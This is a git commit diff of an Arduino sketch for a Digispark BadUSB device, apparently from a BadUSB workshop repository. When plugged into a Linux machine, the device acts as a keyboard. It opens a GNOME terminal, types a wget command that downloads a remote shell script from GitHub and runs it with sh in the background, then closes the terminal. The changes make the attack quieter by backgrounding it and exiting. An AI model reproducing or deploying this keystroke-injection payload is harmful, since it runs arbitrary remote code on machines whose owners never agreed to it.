177ee9fe6510e186a135212e736164b40d727fd1
matheus vrech <whoismath@gmail.com>
2018-01-11 21:06:34 +0000

    Update gnome-linux.ino

--- Linux/gnome-linux.ino
+++ Linux/gnome-linux.ino
@@ -7,15 +7,15 @@ void setup() {
 }
 
 void loop() {
-  for (int i = 0; i < 1; i++) {
-    // put your main code here, to run repeatedly:
-    DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
-    DigiKeyboard.delay(50);
-    DigiKeyboard.print(F("gnome-terminal"));
-    DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
-    DigiKeyboard.delay(300);
-    DigiKeyboard.print(F("wget https://raw.githubusercontent.com/whoismath/BadUSB_Workshop/master/Payloads/payload-linux.sh && sh payload-linux.sh"));
-    DigiKeyboard.delay(100);
-    DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
-  }
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print(F("gnome-terminal"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.println(F("(wget https://raw.githubusercontent.com/whoismath/BadUSB_Workshop/master/Payloads/payload-linux.sh && sh payload-linux.sh) &"));
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println(F("exit"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
+  while(1) {}
 }
